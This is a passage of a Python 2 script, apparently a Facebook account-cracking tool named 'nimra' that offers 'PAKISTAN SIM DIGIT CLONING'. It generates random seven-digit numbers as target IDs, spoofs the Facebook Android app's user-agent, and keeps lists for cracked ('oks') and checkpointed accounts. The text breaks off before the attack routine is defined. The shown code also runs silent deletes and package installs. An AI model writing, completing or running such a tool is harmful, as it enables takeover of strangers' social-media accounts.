#!/usr/bin/python2
#coding=utf-8
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(1000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('my.txt', 'a')
    print nmbr
    sys.stdout.flush()
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 p11.py')
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
back = 0
successful = []
cpb = []
oks = []
id = []
logo ="""
\033[0;92m                
\033[0;93m                
\033[0;91m           
\033[0;93m                  
\033[0;92m          
\033[0;92m███    ██ ██ ███    ███ ██████   █████  
\033[0;93m████   ██ ██ ████  ████ ██   ██ ██   ██ 
\033[0;91m██ ██  ██ ██ ██ ████ ██ ██████  ███████ 
\033[0;93m██  ██ ██ ██ ██  ██  ██ ██   ██ ██   ██ 
\033[0;92m██   ████ ██ ██      ██ ██   ██ ██   ██ 
                                                
                                        """
def menu():
    os.system('clear')
    print logo
    print '\x1b[1;95m  [1]\x1b[1;92m  PAKISTAN SIM DIGIT CLONING'
    print '\x1b[1;95m  [2]\x1b[1;93m  JOIN MY FACE BOOK GROUP'
    print '\x1b[1;95m  [3]\x1b[1;91m  Exit            '
    action()
def action():
    global cpb
    global oks
    bch = raw_input('\n\x1b[1;95m\xe2\x95\x90\xe2\x95\x90[nimra]>  ')
    if bch == '':
        print '[!] Fill in correctly'
        action()
    elif bch == '1':
        os.system('clear')
        print logo
        print '\x1b[1;93m         01 ðŸ’—ðŸ’—ðŸ’—  to  ðŸ’—ðŸ’—ðŸ’— 49'
        try:
            c = raw_input('\x1b[1;96m choose code  : ')
            k = '03'
            idlist = 'my.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
    elif bch == '2':
        os.system('xdg-open https://www.facebook.com/groups/163289698887595/?ref=share')
        login()
    elif bch == '3':
        exb()
    else:
        print '[!] Fill in correctly'
        action()
    xxx = str(len(id))
    print('[\xe2\x9c\x93] Total Password ' + xxx)
    def main(
